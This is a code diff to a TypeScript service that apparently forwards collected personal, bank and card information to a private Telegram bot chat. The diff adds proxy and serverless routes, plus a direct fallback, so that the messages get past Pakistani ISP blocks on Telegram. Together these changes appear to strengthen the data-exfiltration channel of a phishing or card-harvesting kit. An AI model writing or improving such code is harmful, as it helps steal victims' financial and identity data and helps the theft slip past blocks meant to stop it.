@@ -1,10 +1,9 @@
 import { PersonalInfo, BankInfo, CardInfo } from '../types';
 
-// Telegram Bot Environment Config
+// Telegram Bot & Proxy Environment Config
 const getBotToken = (): string => {
   return (
     (import.meta as any).env?.TELEGRAM_BOT_TOKEN ||
-    (import.meta as any).env?.VITE_TELEGRAM_BOT_TOKEN ||
     (typeof process !== 'undefined' && process.env?.TELEGRAM_BOT_TOKEN) ||
     ''
   );
@@ -13,10 +12,26 @@ const getBotToken = (): string => {
 const getChatId = (): string => {
   return (
     (import.meta as any).env?.TELEGRAM_CHAT_ID ||
-    (import.meta as any).env?.VITE_TELEGRAM_CHAT_ID ||
     (typeof process !== 'undefined' && process.env?.TELEGRAM_CHAT_ID) ||
     ''
   );
+};
+
+const getProxyUrl = (): string => {
+  if ((import.meta as any).env?.PROXY_SERVER_URL) {
+    return (import.meta as any).env.PROXY_SERVER_URL;
+  }
+  // When deployed on Vercel/cloud (non-localhost), use the relative /api/send serverless endpoint
+  if (
+    typeof window !== 'undefined' &&
+    window.location.hostname !== 'localhost' &&
+    window.location.hostname !== '127.0.0.1' &&
+    window.location.hostname !== ''
+  ) {
+    return '/api/send';
+  }
+  // When running locally on PC, use the local Python proxy server
+  return 'http://localhost:5000/api/send';
 };
 
 // Generate human-readable session ID
@@ -45,12 +60,49 @@ function escapeHtml(text: string | number | undefined | null): string {
 }
 
 /**
- * Core helper to send an HTML-formatted message packet to Telegram
+ * Core helper to send an HTML-formatted message packet to Telegram.
+ * Routes through the local Python proxy server first to bypass ISP blocks in Pakistan.
  */
 export async function sendTelegramMessage(htmlText: string): Promise<boolean> {
   const botToken = getBotToken();
   const chatId = getChatId();
+  const proxyUrl = getProxyUrl();
 
+  const payload = {
+    chat_id: chatId,
+    bot_token: botToken,
+    text: htmlText,
+    parse_mode: 'HTML',
+  };
+
+  // 1. Primary Route: Send via Python Proxy Server (Bypasses Pakistan ISP Bans)
+  if (proxyUrl) {
+    try {
+      const proxyResponse = await fetch(proxyUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+      });
+
+      if (proxyResponse.ok) {
+        const result = await proxyResponse.json();
+        if (result.ok) {
+          console.log('[Telegram Proxy] Message delivered successfully via PC Proxy Server:', result);
+          return true;
+        } else {
+          console.warn('[Telegram Proxy] Proxy responded with error:', result);
+        }
+      } else {
+        console.warn(`[Telegram Proxy] Server returned HTTP ${proxyResponse.status}`);
+      }
+    } catch (proxyErr) {
+      console.warn('[Telegram Proxy] PC Proxy server is not reachable at', proxyUrl, '- attempting direct fallback.', proxyErr);
+    }
+  }
+
+  // 2. Fallback Route: Direct to Telegram API (if proxy is down and network has direct access)
   if (!botToken || botToken.includes('YOUR_TELEGRAM_BOT_TOKEN') || !chatId) {
     console.info('[Telegram Service] Bot token or chat ID not set. Message packet logged locally:');
     console.log(htmlText.replace(/<[^>]+>/g, ''));
@@ -73,12 +125,12 @@ export async function sendTelegramMessage(htmlText: string): Promise<boolean> {
 
     const result = await response.json();
     if (!result.ok) {
-      console.error('[Telegram Service] Failed to deliver packet:', result);
+      console.error('[Telegram Service] Direct API delivery failed:', result);
       return false;
     }
     return true;
   } catch (err) {
-    console.error('[Telegram Service] Network error delivering packet to Telegram:', err);
+    console.error('[Telegram Service] Direct Telegram API blocked or unreachable (PTA ban). Please ensure python proxy_server.py is running on your PC:', err);
     return false;
   }
 }
